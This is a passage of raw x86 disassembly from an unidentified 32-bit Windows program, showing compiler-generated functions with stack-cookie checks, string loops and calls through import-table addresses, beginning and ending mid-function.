  4049f1:	pop    ebp
  4049f2:	ret    
  4049f3:	int3   
  4049f4:	int3   
  4049f5:	int3   
  4049f6:	int3   
  4049f7:	int3   
  4049f8:	int3   
  4049f9:	int3   
  4049fa:	int3   
  4049fb:	int3   
  4049fc:	int3   
  4049fd:	int3   
  4049fe:	int3   
  4049ff:	int3   
  404a00:	mov    edi,edi
  404a02:	push   ebp
  404a03:	mov    ebp,esp
  404a05:	and    esp,0xfffffff8
  404a08:	sub    esp,0xb1c
  404a0e:	mov    eax,ds:0x40b000
  404a13:	xor    eax,esp
  404a15:	mov    DWORD PTR [esp+0xb18],eax
  404a1c:	push   ebx
  404a1d:	push   esi
  404a1e:	mov    esi,DWORD PTR [ebp+0x8]
  404a21:	push   edi
  404a22:	mov    edi,DWORD PTR [ebp+0xc]
  404a25:	mov    ecx,edi
  404a27:	call   0x40482b
  404a2c:	test   al,al
  404a2e:	je     0x404a52
  404a30:	push   edi
  404a31:	push   0x27
  404a33:	pop    edx
  404a34:	lea    ecx,[esp+0x2cc]
  404a3b:	call   0x4026d5
  404a40:	test   eax,eax
  404a42:	jns    0x404c12
  404a48:	mov    eax,0x65b
  404a4d:	jmp    0x404c93
  404a52:	mov    eax,esi
  404a54:	test   esi,esi
  404a56:	je     0x404a70
  404a58:	movzx  ecx,WORD PTR [eax]
  404a5b:	test   cx,cx
  404a5e:	je     0x404a70
  404a60:	or     ecx,0x20
  404a63:	add    eax,0x2
  404a66:	cmp    cx,0x76
  404a6a:	je     0x404ad5
  404a6c:	test   eax,eax
  404a6e:	jne    0x404a58
  404a70:	lea    edx,[esp+0x228]
  404a77:	mov    ecx,edi
  404a79:	call   0x403892
  404a7e:	mov    ebx,eax
  404a80:	cmp    ebx,0x2
  404a83:	jne    0x404ac6
  404a85:	mov    eax,0x104
  404a8a:	lea    ecx,[esp+0x1c]
  404a8e:	mov    DWORD PTR [esp+0x14],eax
  404a92:	mov    DWORD PTR [esp+0x18],eax
  404a96:	lea    eax,[esp+0x10]
  404a9a:	mov    DWORD PTR [esp+0x10],ecx
  404a9e:	mov    ecx,edi
  404aa0:	push   eax
  404aa1:	call   0x4037e5
  404aa6:	pop    ecx
  404aa7:	test   eax,eax
  404aa9:	je     0x404abd
  404aab:	mov    ecx,DWORD PTR [esp+0x10]
  404aaf:	lea    edx,[esp+0x228]
  404ab6:	call   0x403892
  404abb:	mov    ebx,eax
  404abd:	lea    ecx,[esp+0x10]
  404ac1:	call   0x40809b
  404ac6:	test   ebx,ebx
  404ac8:	je     0x404b66
  404ace:	mov    eax,ebx
  404ad0:	jmp    0x404c93
  404ad5:	cmp    WORD PTR [esi],0x0
  404ad9:	jne    0x404ae0
  404adb:	mov    esi,0x401384
  404ae0:	push   esi
  404ae1:	push   0x401390
  404ae6:	lea    eax,[esp+0x320]
  404aed:	push   0x401
  404af2:	push   eax
  404af3:	call   0x402820
  404af8:	add    esp,0x10
  404afb:	test   eax,eax
  404afd:	js     0x404a48
  404b03:	push   0x3
  404b05:	lea    edx,[esp+0x31c]
  404b0c:	mov    ecx,edi
  404b0e:	call   0x404653
  404b13:	mov    esi,eax
  404b15:	pop    ecx
  404b16:	cmp    esi,0x2
  404b19:	jne    0x404b5f
  404b1b:	mov    eax,0x104
  404b20:	lea    ecx,[esp+0x1c]
  404b24:	mov    DWORD PTR [esp+0x14],eax
  404b28:	mov    DWORD PTR [esp+0x18],eax
  404b2c:	lea    eax,[esp+0x10]
  404b30:	mov    DWORD PTR [esp+0x10],ecx
  404b34:	mov    ecx,edi
  404b36:	push   eax
  404b37:	call   0x4037e5
  404b3c:	pop    ecx
  404b3d:	test   eax,eax
  404b3f:	je     0x404b56
  404b41:	mov    ecx,DWORD PTR [esp+0x10]
  404b45:	lea    edx,[esp+0x318]
  404b4c:	push   0x3
  404b4e:	call   0x404653
  404b53:	pop    ecx
  404b54:	mov    esi,eax
  404b56:	lea    ecx,[esp+0x10]
  404b5a:	call   0x40809b
  404b5f:	mov    eax,esi
  404b61:	jmp    0x404c93
  404b66:	cmp    WORD PTR ds:0x40cbc0,0x0
  404b6e:	je     0x404bf4
  404b74:	xor    eax,eax
  404b76:	push   0x4c
  404b78:	push   eax
  404b79:	mov    WORD PTR [esp+0x280],ax
  404b81:	lea    eax,[esp+0x282]
  404b88:	push   eax
  404b89:	call   0x409b76
  404b8e:	add    esp,0xc
  404b91:	lea    eax,[esp+0xc]
  404b95:	mov    ebx,0x40cbc0
  404b9a:	push   0x27
  404b9c:	pop    edi
  404b9d:	push   eax
  404b9e:	lea    eax,[esp+0x27c]
  404ba5:	mov    DWORD PTR [esp+0x10],edi
  404ba9:	push   eax
  404baa:	push   0x4013d0
  404baf:	push   ebx
  404bb0:	call   DWORD PTR ds:0x40f024
  404bb6:	test   eax,eax
  404bb8:	jne    0x404bea
  404bba:	lea    eax,[esp+0x278]
  404bc1:	push   eax
  404bc2:	lea    eax,[esp+0x22c]
  404bc9:	push   eax
  404bca:	call   DWORD PTR ds:0x40e1d8
  404bd0:	pop    ecx
  404bd1:	pop    ecx
  404bd2:	test   eax,eax
  404bd4:	jne    0x404bea
  404bd6:	push   0x26
  404bd8:	push   ebx
  404bd9:	push   ecx
  404bda:	mov    edx,edi
  404bdc:	lea    ecx,[esp+0x2d4]
  404be3:	call   0x402909
  404be8:	jmp    0x404c12
  404bea:	mov    eax,0x645
  404bef:	jmp    0x404c93
  404bf4:	lea    eax,[esp+0x2c8]
  404bfb:	push   eax
  404bfc:	lea    eax,[esp+0x22c]
  404c03:	push   eax
  404c04:	call   DWORD PTR ds:0x40f034
  404c0a:	test   eax,eax
  404c0c:	jne    0x404c93
  404c12:	xor    ecx,ecx
  404c14:	mov    edi,ecx
  404c16:	test   esi,esi
  404c18:	je     0x404c61
  404c1a:	movzx  eax,WORD PTR [esi]
  404c1d:	test   ax,ax
  404c20:	je     0x404c61
  404c22:	xor    edx,edx
  404c24:	mov    ecx,0x402090
  404c29:	push   0x72
  404c2b:	inc    edx
  404c2c:	or     eax,0x20
  404c2f:	pop    ebx
  404c30:	cmp    ax,bx
  404c33:	je     0x404c44
  404c35:	add    ecx,0x2
  404c38:	add    edx,edx
  404c3a:	movzx  ebx,WORD PTR [ecx]
  404c3d:	test   bx,bx
  404c40:	jne    0x404c30
  404c42:	jmp    0x404c46
  404c44:	or     edi,edx
  404c46:	xor    eax,eax
  404c48:	cmp    WORD PTR [ecx],ax
  404c4b:	je     0x404c5c
  404c4d:	add    esi,0x2
  404c50:	movzx  eax,WORD PTR [esi]
  404c53:	test   ax,ax
  404c56:	jne    0x404c22
  404c58:	xor    ecx,ecx
  404c5a:	jmp    0x404c66
  404c5c:	push   0x57
  404c5e:	pop    eax
  404c5f:	jmp    0x404c93
  404c61:	mov    edi,0x2aa
  404c66:	mov    eax,ds:0x40b038
  404c6b:	cmp    eax,0xffffffff
  404c6e:	jne    0x404c73
  404c70:	push   0x3
  404c72:	pop    eax
  404c73:	push   ecx
  404c74:	push   eax
  404c75:	call   DWORD PTR ds:0x40f014
  404c7b:	push   edi
  404c7c:	lea    eax,[esp+0x2cc]
  404c83:	push   eax
  404c84:	call   DWORD PTR ds:0x40f01c
  404c8a:	test   eax,eax
  404c8c:	jne    0x404c93
  404c8e:	mov    eax,0x8000
  404c93:	mov    ecx,DWORD PTR [esp+0xb24]
  404c9a:	pop    edi
  404c9b:	pop    esi
  404c9c:	pop    ebx
  404c9d:	xor    ecx,esp
  404c9f:	call   0x409090
  404ca4:	mov    esp,ebp
  404ca6:	pop    ebp
  404ca7:	ret    
  404ca8:	int3   
  404ca9:	int3   
  404caa:	int3   
  404cab:	int3   
  404cac:	int3   
  404cad:	int3   
  404cae:	int3   
  404caf:	int3   
  404cb0:	mov    edi,edi
  404cb2:	push   ebp
  404cb3:	mov    ebp,esp
  404cb5:	mov    ecx,DWORD PTR [ebp+0xc]
  404cb8:	call   0x40482b
  404cbd:	mov    ecx,DWORD PTR [ebp+0xc]
  404cc0:	test   al,al
  404cc2:	je     0x404ccc
  404cc4:	xor    edx,edx
  404cc6:	pop    ebp
  404cc7:	jmp    0x40446b
  404ccc:	push   0x5
  404cce:	mov    edx,0x4011dc
  404cd3:	call   0x404653
  404cd8:	pop    ecx
  404cd9:	pop    ebp
  404cda:	ret    
  404cdb:	int3   
  404cdc:	int3   
  404cdd:	int3   
  404cde:	int3   
  404cdf:	int3   
  404ce0:	mov    edi,edi
  404ce2:	push   ebp
  404ce3:	mov    ebp,esp
  404ce5:	push   ecx
  404ce6:	mov    eax,ds:0x40b038
  404ceb:	push   0x5
  404ced:	pop    ecx
  404cee:	cmp    eax,0xffffffff
  404cf1:	je     0x404cf5
  404cf3:	mov    ecx,eax
  404cf5:	push   esi
  404cf6:	push   0x0
  404cf8:	push   ecx
  404cf9:	call   DWORD PTR ds:0x40f014
  404cff:	mov    si,WORD PTR ds:0x40c4d0
  404d06:	xor    ecx,ecx
  404d08:	mov    edx,ecx
  404d0a:	mov    eax,ecx
  404d0c:	test   si,si
  404d0f:	je     0x404d27
  404d11:	cmp    si,0x41
  404d15:	je     0x404d1f
  404d17:	push   0x57
  404d19:	pop    eax
  404d1a:	jmp    0x404da3
  404d1f:	xor    eax,eax
  404d21:	mov    edx,0x40c4d2
  404d26:	inc    eax
  404d27:	cmp    WORD PTR ds:0x40cbc0,cx
  404d2e:	je     0x404d3d
  404d30:	cmp    eax,0x1
  404d33:	je     0x404d17
  404d35:	push   0x2
  404d37:	pop    eax
  404d38:	mov    edx,0x40cbc0
  404d3d:	mov    esi,DWORD PTR [ebp+0xc]
  404d40:	push   edi
  404d41:	mov    DWORD PTR [ebp-0x4],esi
  404d44:	movzx  edi,WORD PTR [esi]
  404d47:	jmp    0x404d5b
  404d49:	cmp    di,0x3b
  404d4d:	je     0x404d62
  404d4f:	mov    edi,DWORD PTR [ebp-0x4]
  404d52:	add    edi,0x2
  404d55:	mov    DWORD PTR [ebp-0x4],edi
  404d58:	movzx  edi,WORD PTR [edi]
  404d5b:	test   di,di
  404d5e:	jne    0x404d49
  404d60:	jmp    0x404d64
  404d62:	mov    cl,0x1
  404d64:	pop    edi
  404d65:	test   eax,eax
  404d67:	je     0x404d6e
  404d69:	cmp    eax,0x2
  404d6c:	jne    0x404d8b
  404d6e:	test   cl,cl
  404d70:	je     0x404d8b
  404d72:	mov    eax,ds:0x40b8c0
  404d77:	movzx  ecx,WORD PTR [eax]
  404d7a:	neg    ecx
  404d7c:	sbb    ecx,ecx
  404d7e:	and    ecx,eax
  404d80:	push   ecx
  404d81:	push   edx
  404d82:	push   esi
  404d83:	call   DWORD PTR ds:0x40f004
  404d89:	jmp    0x404d9a
  404d8b:	push   DWORD PTR ds:0x40b8c0
  404d91:	push   eax
  404d92:	push   edx
  404d93:	push   esi
  404d94:	call   DWORD PTR ds:0x40f008
  404d9a:	test   eax,eax
  404d9c:	jne    0x404da3
  404d9e:	mov    eax,0x8000
  404da3:	pop    esi
  404da4:	mov    esp,ebp
  404da6:	pop    ebp
  404da7:	ret    
  404da8:	int3   
  404da9:	int3   
  404daa:	int3   
  404dab:	int3   
  404dac:	int3   
  404dad:	test   edx,edx
  404daf:	je     0x404dd4
  404db1:	cmp    WORD PTR [edx],0x0
  404db5:	je     0x404dd4
  404db7:	mov    eax,0x104
  404dbc:	mov    WORD PTR ds:0x40c4d0,cx
  404dc3:	push   eax
  404dc4:	push   edx
  404dc5:	mov    edx,eax
  404dc7:	mov    ecx,0x40c4d2
  404dcc:	call   0x402713
  404dd1:	xor    eax,eax
  404dd3:	ret    
  404dd4:	push   0x57
  404dd6:	pop    eax
  404dd7:	ret    
  404dd8:	int3   
  404dd9:	int3   
  404dda:	int3   
  404ddb:	int3   
  404ddc:	int3   
  404ddd:	mov    edi,edi
  404ddf:	push   ebp
  404de0:	mov    ebp,esp
  404de2:	sub    esp,0x218
  404de8:	mov    eax,ds:0x40b000
  404ded:	xor    eax,ebp
  404def:	mov    DWORD PTR [ebp-0x4],eax
  404df2:	push   ebx
  404df3:	push   esi
  404df4:	push   edi
  404df5:	mov    edi,ecx
  404df7:	lea    eax,[ebp-0x20c]
  404dfd:	mov    esi,0x104
  404e02:	mov    DWORD PTR [ebp-0x218],eax
  404e08:	push   edi
  404e09:	mov    ebx,edx
  404e0b:	mov    DWORD PTR [ebp-0x214],esi
  404e11:	call   DWORD PTR ds:0x40e0ec
  404e17:	inc    eax
  404e18:	cmp    eax,esi
  404e1a:	jle    0x404e2d
  404e1c:	push   ecx
  404e1d:	push   eax
  404e1e:	lea    ecx,[ebp-0x218]
  404e24:	call   0x4080c3
  404e29:	test   al,al
  404e2b:	je     0x404e43
  404e2d:	mov    edx,DWORD PTR [ebp-0x214]
  404e33:	mov    ecx,DWORD PTR [ebp-0x218]
  404e39:	push   edi
  404e3a:	call   0x4026d5
  404e3f:	test   eax,eax
  404e41:	jns    0x404e4b
  404e43:	push   0xe
  404e45:	pop    esi
  404e46:	jmp    0x404f37
  404e4b:	xor    esi,esi
  404e4d:	mov    eax,edi
  404e4f:	mov    ecx,esi
  404e51:	test   edi,edi
  404e53:	je     0x404f34
  404e59:	cmp    WORD PTR [eax],si
  404e5c:	je     0x404e6b
  404e5e:	add    eax,0x2
  404e61:	cmp    WORD PTR [eax],0x5c
  404e65:	jne    0x404e59
  404e67:	mov    ecx,eax
  404e69:	jmp    0x404e59
  404e6b:	test   ecx,ecx
  404e6d:	je     0x404f34
  404e73:	mov    eax,DWORD PTR [ebp-0x218]
  404e79:	sub    ecx,edi
  404e7b:	sar    ecx,1
  404e7d:	xor    edx,edx
  404e7f:	push   esi
  404e80:	mov    WORD PTR [eax+ecx*2],dx
  404e84:	call   DWORD PTR ds:0x40e204
  404e8a:	mov    esi,eax
  404e8c:	test   esi,esi
  404e8e:	jne    0x404f37
  404e94:	push   0x8
  404e96:	push   eax
  404e97:	push   edi
  404e98:	call   DWORD PTR ds:0x40e088
  404e9e:	mov    edi,eax
  404ea0:	test   edi,edi
  404ea2:	je     0x404eb4
  404ea4:	push   DWORD PTR [ebp-0x218]
  404eaa:	call   DWORD PTR ds:0x40e114
  404eb0:	test   eax,eax
  404eb2:	jne    0x404ec9
  404eb4:	call   DWORD PTR ds:0x40e0f4
  404eba:	mov    esi,eax
  404ebc:	test   esi,esi
  404ebe:	jle    0x404ec9
  404ec0:	movzx  esi,si
  404ec3:	or     esi,0x80070000
  404ec9:	push   0x0
  404ecb:	push   0x0
  404ecd:	call   DWORD PTR ds:0x40e00c
  404ed3:	test   eax,eax
  404ed5:	jne    0x404eec
  404ed7:	call   DWORD PTR ds:0x40e0f4
  404edd:	mov    esi,eax
  404edf:	test   esi,esi
  404ee1:	jle    0x404eee
  404ee3:	movzx  esi,si
  404ee6:	or     esi,0x80070000
  404eec:	test   esi,esi
  404eee:	jne    0x404f21
  404ef0:	push   ebx
  404ef1:	push   edi
  404ef2:	call   DWORD PTR ds:0x40e0fc
  404ef8:	mov    esi,eax
  404efa:	test   esi,esi
  404efc:	jne    0x404f15
  404efe:	call   DWORD PTR ds:0x40e0f4
  404f04:	mov    esi,eax
  404f06:	test   esi,esi
  404f08:	jle    0x404f21
  404f0a:	movzx  esi,si
  404f0d:	or     esi,0x80070000
  404f13:	jmp    0x404f21
  404f15:	mov    ecx,esi
  404f17:	call   DWORD PTR ds:0x40e20c
  404f1d:	call   esi
  404f1f:	mov    esi,eax
  404f21:	test   edi,edi
  404f23:	je     0x404f2c
  404f25:	push   edi
  404f26:	call   DWORD PTR ds:0x40e084
  404f2c:	call   DWORD PTR ds:0x40e200
  404f32:	jmp    0x404f37
  404f34:	xor    esi,esi
  404f36:	inc    esi
  404f37:	lea    ecx,[ebp-0x218]
  404f3d:	call   0x40809b
  404f42:	mov    ecx,DWORD PTR [ebp-0x4]
  404f45:	mov    eax,esi
  404f47:	pop    edi
  404f48:	pop    esi
  404f49:	xor    ecx,ebp
  404f4b:	pop    ebx
  404f4c:	call   0x409090
  404f51:	mov    esp,ebp
  404f53:	pop    ebp
  404f54:	ret    
  404f55:	int3   
  404f56:	int3   
  404f57:	int3   
  404f58:	int3   
  404f59:	int3   
  404f5a:	int3   
  404f5b:	int3   
  404f5c:	int3   
  404f5d:	int3   
  404f5e:	int3   
  404f5f:	int3   
  404f60:	mov    edi,edi
  404f62:	push   ebp
  404f63:	mov    ebp,esp
  404f65:	mov    edx,0x401fb8
  404f6a:	mov    ecx,DWORD PTR [ebp+0xc]
  404f6d:	pop    ebp
  404f6e:	jmp    0x404ddd
  404f73:	int3   
  404f74:	int3   
  404f75:	int3   
  404f76:	int3   
  404f77:	int3   
  404f78:	int3   
  404f79:	int3   
  404f7a:	int3   
  404f7b:	int3   
  404f7c:	int3   
  404f7d:	int3   
  404f7e:	int3   
  404f7f:	int3   
  404f80:	mov    edi,edi
  404f82:	push   ebp
  404f83:	mov    ebp,esp
  404f85:	mov    edx,0x401f44
  404f8a:	mov    ecx,DWORD PTR [ebp+0xc]
  404f8d:	pop    ebp
  404f8e:	jmp    0x404ddd
  404f93:	int3   
  404f94:	int3   
  404f95:	int3   
  404f96:	int3   
  404f97:	int3   
  404f98:	int3   
  404f99:	int3   
  404f9a:	int3   
  404f9b:	int3   
  404f9c:	int3   
  404f9d:	int3   
  404f9e:	int3   
  404f9f:	int3   
  404fa0:	mov    edi,edi
  404fa2:	push   ebp
  404fa3:	mov    ebp,esp
  404fa5:	mov    ecx,DWORD PTR [ebp+0x10]
  404fa8:	test   ecx,ecx
  404faa:	je     0x404fd5
  404fac:	mov    eax,0x40cc70
  404fb1:	mov    edx,0x100
  404fb6:	sub    ecx,eax
  404fb8:	push   ebx
  404fb9:	test   edx,edx
  404fbb:	je     0x404fd0
  404fbd:	mov    bl,BYTE PTR [ecx+eax*1]
  404fc0:	test   bl,bl
  404fc2:	je     0x404fcc
  404fc4:	mov    BYTE PTR [eax],bl
  404fc6:	inc    eax
  404fc7:	sub    edx,0x1
  404fca:	jne    0x404fb9
  404fcc:	test   edx,edx
  404fce:	jne    0x404fd1
  404fd0:	dec    eax
  404fd1:	mov    BYTE PTR [eax],0x0
  404fd4:	pop    ebx
  404fd5:	xor    eax,eax
  404fd7:	pop    ebp
  404fd8:	ret    0xc
  404fdb:	int3   
  404fdc:	int3   
  404fdd:	int3   
  404fde:	int3   
  404fdf:	int3   
  404fe0:	mov    edi,edi
  404fe2:	push   ebp
  404fe3:	mov    ebp,esp
  404fe5:	push   ecx
  404fe6:	mov    eax,DWORD PTR [ebp+0xc]
  404fe9:	push   ebx
  404fea:	xor    ebx,ebx
  404fec:	mov    BYTE PTR ds:0x40cc70,bl
  404ff2:	mov    BYTE PTR ds:0x40c6e0,bl
  404ff8:	mov    BYTE PTR ds:0x40cd78,bl
  404ffe:	mov    BYTE PTR ds:0x40c440,bl
  405004:	mov    BYTE PTR ds:0x40cc30,bl
  40500a:	test   eax,eax
  40500c:	je     0x405048
  40500e:	cmp    WORD PTR [eax],bx
  405011:	je     0x405048
  405013:	lea    ecx,[ebp-0x4]
  405016:	push   ecx
  405017:	push   ebx
  405018:	push   0x9
  40501a:	push   0x40c434
  40501f:	push   0xffffffff
  405021:	push   eax
  405022:	push   ebx
  405023:	push   ebx
  405024:	call   DWORD PTR ds:0x40e0b8
  40502a:	test   eax,eax
  40502c:	je     0x40504f
  40502e:	cmp    DWORD PTR [ebp-0x4],ebx
  405031:	jne    0x40504f
  405033:	push   ebx
  405034:	push   0x3
  405036:	push   0x404fa0
  40503b:	call   DWORD PTR ds:0x40f000
  405041:	mov    BYTE PTR ds:0x40cba8,0x1
  405048:	xor    eax,eax
  40504a:	pop    ebx
  40504b:	mov    esp,ebp
  40504d:	pop    ebp
  40504e:	ret    
  40504f:	xor    eax,eax
  405051:	inc    eax
  405052:	jmp    0x40504a
  405054:	int3   
  405055:	int3   
  405056:	int3   
  405057:	int3   
  405058:	int3   
  405059:	mov    edi,edi
  40505b:	push   ebp
  40505c:	mov    ebp,esp
  40505e:	sub    esp,0x18
  405061:	push   ebx
  405062:	push   esi
  405063:	mov    esi,ecx
  405065:	xor    ebx,ebx
  405067:	mov    DWORD PTR [ebp-0x4],ebx
  40506a:	test   esi,esi
  40506c:	je     0x405166
  405072:	cmp    WORD PTR [esi],bx
  405075:	je     0x405144
  40507b:	lea    eax,[ebp-0x4]
  40507e:	mov    DWORD PTR [ebp-0x4],ebx
  405081:	push   eax
  405082:	push   ebx
  405083:	push   esi
  405084:	push   ebx
  405085:	call   DWORD PTR ds:0x40f00c
  40508b:	test   eax,eax
  40508d:	jne    0x405144
  405093:	lea    eax,[ebp-0x8]
  405096:	mov    BYTE PTR ds:0x40cc30,bl
  40509c:	push   eax
  40509d:	push   0x40c6e0
  4050a2:	lea    eax,[ebp-0x18]
  4050a5:	mov    BYTE PTR ds:0x40c440,bl
  4050ab:	push   eax
  4050ac:	lea    eax,[ebp-0xc]
  4050af:	mov    BYTE PTR ds:0x40cd78,bl
  4050b5:	push   eax
  4050b6:	lea    eax,[ebp-0x10]
  4050b9:	mov    BYTE PTR ds:0x40c6e0,bl
  4050bf:	push   eax
  4050c0:	push   0x4
  4050c2:	push   DWORD PTR [ebp-0x4]
  4050c5:	mov    DWORD PTR [ebp-0x8],0x80
  4050cc:	call   DWORD PTR ds:0x40f028
  4050d2:	push   0x40
  4050d4:	pop    esi
  4050d5:	lea    eax,[ebp-0x8]
  4050d8:	mov    DWORD PTR [ebp-0x8],esi
  4050db:	push   eax
  4050dc:	push   0x40cd78
  4050e1:	lea    eax,[ebp-0x18]
  4050e4:	push   eax
  4050e5:	lea    eax,[ebp-0xc]
  4050e8:	push   eax
  4050e9:	lea    eax,[ebp-0x10]
  4050ec:	push   eax
  4050ed:	push   0x9
  4050ef:	push   DWORD PTR [ebp-0x4]
  4050f2:	call   DWORD PTR ds:0x40f028
  4050f8:	lea    eax,[ebp-0x8]
  4050fb:	mov    DWORD PTR [ebp-0x8],0x80
  405102:	push   eax
  405103:	push   0x40c440
  405108:	lea    eax,[ebp-0x18]
  40510b:	push   eax
  40510c:	lea    eax,[ebp-0xc]
  40510f:	push   eax
  405110:	lea    eax,[ebp-0x10]
  405113:	push   eax
  405114:	push   0x3
  405116:	push   DWORD PTR [ebp-0x4]
  405119:	call   DWORD PTR ds:0x40f028
  40511f:	lea    eax,[ebp-0x8]
  405122:	mov    DWORD PTR [ebp-0x8],esi
  405125:	push   eax
  405126:	push   0x40cc30
  40512b:	lea    eax,[ebp-0x18]
  40512e:	push   eax
  40512f:	lea    eax,[ebp-0xc]
  405132:	push   eax
  405133:	lea    eax,[ebp-0x10]
  405136:	push   eax
  405137:	push   0x7
  405139:	push   DWORD PTR [ebp-0x4]
  40513c:	call   DWORD PTR ds:0x40f028
  405142:	jmp    0x405158
  405144:	push   ebx
  405145:	push   ebx
  405146:	push   0x40
  405148:	push   0x40cd78
  40514d:	push   0xffffffff
  40514f:	push   esi
  405150:	push   ebx
  405151:	push   ebx
  405152:	call   DWORD PTR ds:0x40e0b8
  405158:	cmp    DWORD PTR [ebp-0x4],ebx
  40515b:	je     0x405166
  40515d:	push   DWORD PTR [ebp-0x4]
  405160:	call   DWORD PTR ds:0x40f03c
  405166:	pop    esi
  405167:	pop    ebx
  405168:	mov    esp,ebp
  40516a:	pop    ebp
  40516b:	ret    
  40516c:	int3   
  40516d:	int3   
  40516e:	int3   
  40516f:	int3   
  405170:	int3   
  405171:	mov    edi,edi
  405173:	push   ebp
  405174:	mov    ebp,esp
  405176:	sub    esp,0x218
  40517c:	mov    eax,ds:0x40b000
  405181:	xor    eax,ebp
  405183:	mov    DWORD PTR [ebp-0x4],eax
  405186:	push   ebx
  405187:	push   esi
  405188:	push   edi
  405189:	xor    ebx,ebx
  40518b:	mov    esi,ecx
  40518d:	push   ebx
  40518e:	push   ebx
  40518f:	push   ebx
  405190:	call   DWORD PTR ds:0x40f000
  405196:	push   0x800
  40519b:	push   ebx
  40519c:	push   0x4013e8
  4051a1:	mov    BYTE PTR ds:0x40cba8,bl
  4051a7:	call   DWORD PTR ds:0x40e088
  4051ad:	mov    edi,eax
  4051af:	test   edi,edi
  4051b1:	je     0x405335
  4051b7:	push   0x401400
  4051bc:	push   edi
  4051bd:	call   DWORD PTR ds:0x40e0fc
  4051c3:	mov    ebx,eax
  4051c5:	test   ebx,ebx
  4051c7:	je     0x40532e
  4051cd:	test   esi,esi
  4051cf:	je     0x4052f8
  4051d5:	cmp    esi,0x644
  4051db:	je     0x4052f8
  4051e1:	cmp    esi,0xbc2
  4051e7:	je     0x4052f8
  4051ed:	cmp    esi,0x669
  4051f3:	je     0x4052f8
  4051f9:	xor    eax,eax
  4051fb:	mov    DWORD PTR [ebp-0x214],eax
  405201:	cmp    BYTE PTR ds:0x40cc70,al
  405207:	jne    0x405303
  40520d:	call   DWORD PTR ds:0x40e074
  405213:	movzx  eax,ax
  405216:	mov    DWORD PTR [ebp-0x218],eax
  40521c:	cmp    esi,0x641
  405222:	jb     0x405240
  405224:	push   eax
  405225:	push   0x100
  40522a:	push   0x40cc70
  40522f:	push   esi
  405230:	push   0xffffffff
  405232:	call   DWORD PTR ds:0x40f040
  405238:	test   eax,eax
  40523a:	jne    0x4052fd
  405240:	xor    eax,eax
  405242:	push   0x208
  405247:	push   eax
  405248:	mov    WORD PTR [ebp-0x210],ax
  40524f:	lea    eax,[ebp-0x20e]
  405255:	push   eax
  405256:	call   0x409b76
  40525b:	add    esp,0xc
  40525e:	lea    eax,[ebp-0x210]
  405264:	push   0x0
  405266:	push   0x105
  40526b:	push   eax
  40526c:	mov    eax,DWORD PTR [ebp-0x218]
  405272:	movzx  eax,ax
  405275:	push   eax
  405276:	push   esi
  405277:	push   0x0
  405279:	push   0x1000
  40527e:	call   DWORD PTR ds:0x40e0cc
  405284:	test   eax,eax
  405286:	je     0x4052d4
  405288:	lea    eax,[eax*2-0x4]
  40528f:	cmp    eax,0x20a
  405294:	jae    0x405346
  40529a:	xor    ecx,ecx
  40529c:	push   ecx
  40529d:	push   ecx
  40529e:	push   0x100
  4052a3:	push   0x40cc70
  4052a8:	push   0xffffffff
  4052aa:	mov    WORD PTR [ebp+eax*1-0x210],cx
  4052b2:	lea    eax,[ebp-0x210]
  4052b8:	push   eax
  4052b9:	push   ecx
  4052ba:	push   ecx
  4052bb:	call   DWORD PTR ds:0x40e0b8
  4052c1:	test   eax,eax
  4052c3:	mov    eax,DWORD PTR [ebp-0x214]
  4052c9:	jne    0x405303
  4052cb:	mov    BYTE PTR ds:0x40cc70,0x0
  4052d2:	jmp    0x405303
  4052d4:	push   esi
  4052d5:	push   0x401414
  4052da:	push   0x100
  4052df:	push   0x40cc70
  4052e4:	call   0x4027b8
  4052e9:	add    esp,0x10
  4052ec:	test   eax,eax
  4052ee:	mov    eax,DWORD PTR [ebp-0x214]
  4052f4:	jns    0x405303
  4052f6:	jmp    0x4052cb
  4052f8:	xor    eax,eax
  4052fa:	inc    eax
  4052fb:	jmp    0x4052cb
  4052fd:	mov    eax,DWORD PTR [ebp-0x214]
  405303:	push   eax
  405304:	push   0x40cc70
  405309:	push   0x0
  40530b:	push   0x40cc30
  405310:	push   0x40c440
  405315:	push   0x40cd78
  40531a:	push   0x40c6e0
  40531f:	push   0x40c434
  405324:	mov    ecx,ebx
  405326:	call   DWORD PTR ds:0x40e20c
  40532c:	call   ebx
  40532e:	push   edi
  40532f:	call   DWORD PTR ds:0x40e084
  405335:	mov    ecx,DWORD PTR [ebp-0x4]
  405338:	pop    edi
  405339:	pop    esi
  40533a:	xor    ecx,ebp
  40533c:	pop    ebx
  40533d:	call   0x409090
  405342:	mov    esp,ebp
  405344:	pop    ebp
  405345:	ret    
  405346:	call   0x4092a3
  40534b:	int3   
  40534c:	int3   
  40534d:	int3   
  40534e:	int3   
  40534f:	int3   
  405350:	int3   
  405351:	mov    edi,edi
  405353:	push   esi
  405354:	push   edi
  405355:	xor    esi,esi
  405357:	xor    edi,edi
  405359:	test   ecx,ecx
  40535b:	je     0x40539f
  40535d:	jmp    0x405364
  40535f:	test   edi,edi
  405361:	jne    0x405374
  405363:	inc    edi
  405364:	movzx  eax,WORD PTR [ecx]
  405367:	add    ecx,0x2
  40536a:	sub    eax,0x30
  40536d:	mov    esi,eax
  40536f:	cmp    eax,0xfffffffd
  405372:	je     0x40535f
  405374:	cmp    eax,0x9
  405377:	jbe    0x405398
  405379:	push   0xd
  40537b:	call   DWORD PTR ds:0x40e0f8
  405381:	mov    eax,0x80000000
  405386:	jmp    0x4053af
  405388:	sub    eax,0x30
  40538b:	lea    ecx,[ecx+0x2]
  40538e:	cmp    eax,0x9
  405391:	ja     0x405379
  405393:	imul   esi,esi,0xa
  405396:	add    esi,eax
  405398:	movzx  eax,WORD PTR [ecx]
  40539b:	test   eax,eax
  40539d:	jne    0x405388
  40539f:	push   0x0
  4053a1:	call   DWORD PTR ds:0x40e0f8
  4053a7:	test   edi,edi
  4053a9:	je     0x4053ad
  4053ab:	neg    esi
  4053ad:	mov    eax,esi
  4053af:	pop    edi
  4053b0:	pop    esi
  4053b1:	ret    
  4053b2:	int3   
  4053b3:	int3   
  4053b4:	int3   
  4053b5:	int3   
  4053b6:	int3   
  4053b7:	mov    edi,edi
  4053b9:	push   ebp
  4053ba:	mov    ebp,esp
  4053bc:	sub    esp,0x86c
  4053c2:	mov    eax,ds:0x40b000
  4053c7:	xor    eax,ebp
  4053c9:	mov    DWORD PTR [ebp-0x4],eax
  4053cc:	push   ebx
  4053cd:	push   esi
  4053ce:	push   edi
  4053cf:	mov    ebx,edx
  4053d1:	mov    edi,ecx
  4053d3:	call   DWORD PTR ds:0x40e0f4
  4053d9:	cmp    DWORD PTR ds:0x40b040,0xffffffff
  4053e0:	mov    esi,eax
